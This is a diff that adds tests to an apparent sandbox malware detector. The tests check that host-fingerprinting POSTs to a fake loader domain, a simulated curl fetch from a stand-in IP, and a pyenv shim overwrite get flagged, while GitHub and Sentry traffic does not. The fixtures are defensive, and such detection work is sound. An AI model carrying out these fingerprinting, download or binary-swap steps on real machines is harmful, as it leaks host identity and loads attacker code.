@@ -187,6 +187,78 @@ def test_binary_swap_ignores_project_bin_node_modules_and_caches():
     assert rep["verdict"] == "NO MALICIOUS BEHAVIOUR OBSERVED", rep["findings"]
 
 
+HOSTNAME = "dev-thinkpad-t14s-q7k2"
+
+
+def run_fp(sys_lines, net, bodies):
+    """run() with identity.json and captured request bodies ({event id: bytes})."""
+    steps = [{"name": "npm run start", "cmd": "npm start", "rc": 137, "why": "", "t0": T0, "t1": T0 + 45}]
+    with tempfile.TemporaryDirectory() as d:
+        Path(d, "tokens.json").write_text(json.dumps(TOKENS))
+        Path(d, "identity.json").write_text(json.dumps({"hostname": HOSTNAME, "username": "dev"}))
+        Path(d, "steps.json").write_text(json.dumps(steps))
+        Path(d, "bodies").mkdir()
+        for i, b in bodies.items():
+            Path(d, "bodies", f"{i}.bin").write_bytes(b)
+        net = [{**e, "body_file": f"{e['id']}.bin", "body_len": len(bodies[e["id"]])} if e["id"] in bodies else e
+               for e in net]
+        Path(d, "net.jsonl").write_text("".join(json.dumps(e) + "\n" for e in net))
+        Path(d, "syscalls.log").write_text("".join(sys_lines))
+        detect.main(d)
+        return json.loads(Path(d, "report.json").read_text())
+
+
+LOADER = {"type": "tcp", "dst_ip": "198.18.0.3", "dst_port": 443, "host": "cdn-fonts.example", "sni": "cdn-fonts.example",
+          "tls": True, "proto": "https", "method": "POST", "path": "/api/v2/init", "http_host": "cdn-fonts.example",
+          "id": 11, "t": T0 + 5}
+GH = {"type": "tcp", "dst_ip": "198.18.0.2", "dst_port": 443, "host": "api.github.com", "sni": "api.github.com",
+      "tls": True, "proto": "https", "method": "GET", "path": "/users/octocat", "http_host": "api.github.com",
+      "id": 12, "t": T0 + 6}
+
+
+def test_fingerprint_hexeval_style_post_is_suspicious():
+    """HexEval (Socket, Jul 2025): POST hostname/platform/username, eval the reply."""
+    body = json.dumps({"h": HOSTNAME, "p": "linux", "u": "dev"}).encode()
+    rep = run_fp([], net=(LOADER,), bodies={11: body})
+    (f,) = rules(rep, "FINGERPRINT")
+    assert f["severity"] == "high" and f["evidence"]["sent_to"] == "cdn-fonts.example"
+    assert f["evidence"]["fields"] == ["hostname", "username", "OS"]
+    assert rep["verdict"] == "SUSPICIOUS" and "cdn-fonts.example" in rep["headline"]
+
+
+def test_fingerprint_found_when_encoded():
+    import base64
+    body = b"d=" + base64.b64encode(json.dumps({"host": HOSTNAME, "plat": "linux"}).encode())
+    rep = run_fp([], net=(LOADER,), bodies={11: body})
+    assert rules(rep, "FINGERPRINT") and rules(rep, "FINGERPRINT")[0]["evidence"]["encoded"]
+
+
+def test_fingerprint_plus_downloader_is_malicious():
+    rep = run_fp([line("execve", '0x7f00 /usr/bin/curl, ["curl", "-s", "http://198.51.100.40/s"], ["PATH=/usr/bin"]',
+                       ret="= 0 (0x0)", comm="node")],
+                 net=(LOADER,), bodies={11: f"host={HOSTNAME}".encode()})
+    assert rep["verdict"] == "MALICIOUS" and "loader" in rep["headline"]
+
+
+def test_fingerprint_plus_binary_swap_is_malicious():
+    rep = run_fp([wr("/home/dev/.pyenv/shims/pyenv")], net=(LOADER,), bodies={11: f"host={HOSTNAME}".encode()})
+    assert rules(rep, "FINGERPRINT") and rules(rep, "BINARY_SWAP") and rep["verdict"] == "MALICIOUS"
+
+
+def test_no_fingerprint_for_github_api_or_generic_words():
+    """b05 calls api.github.com; 'dev' / 'linux' on the wire without the scan's hostname mean nothing."""
+    rep = run_fp([], net=(GH, LOADER), bodies={12: b"", 11: b'{"user":"dev","platform":"linux","host":"dev-laptop"}'})
+    assert not rules(rep, "FINGERPRINT")
+    assert rep["verdict"] == "NO MALICIOUS BEHAVIOUR OBSERVED", rep["findings"]
+
+
+def test_no_fingerprint_for_error_reporting_sdk():
+    sentry = {**LOADER, "host": "o1.ingest.sentry.io", "sni": "o1.ingest.sentry.io", "http_host": "o1.ingest.sentry.io",
+              "path": "/api/1/envelope/"}
+    rep = run_fp([], net=(sentry,), bodies={11: json.dumps({"server_name": HOSTNAME}).encode()})
+    assert not rules(rep, "FINGERPRINT")
+
+
 if __name__ == "__main__":
     for name, fn in list(globals().items()):
         if name.startswith("test_"):
